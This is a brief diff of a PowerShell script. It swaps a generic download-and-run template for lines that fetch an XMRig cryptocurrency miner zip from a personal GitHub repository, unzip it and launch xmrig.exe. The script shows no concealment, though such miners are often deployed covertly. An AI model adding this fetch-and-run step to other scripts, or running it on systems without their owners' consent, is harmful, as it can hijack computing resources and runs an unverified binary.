@@ -1,11 +1,11 @@
 # Download the file
-Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"
+Invoke-WebRequest -Uri "https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig-6.21.0-msvc-win64.zip"
 
 # Unzip the file
-Expand-Archive -Path "file.zip" -DestinationPath "./unzipped" -Force
+Expand-Archive -Path "xmrig-6.21.0-msvc-win64.zip" -DestinationPath "./unzipped" -Force
 
 # Change directory
 Set-Location -Path "./unzipped"
-
+Set-Location -Path "./xmrig-6.21.0-msvc-win64"
 # Execute the file
-Start-Process -FilePath ".\yourfile.exe"
+Start-Process -FilePath ".\xmrig.exe"
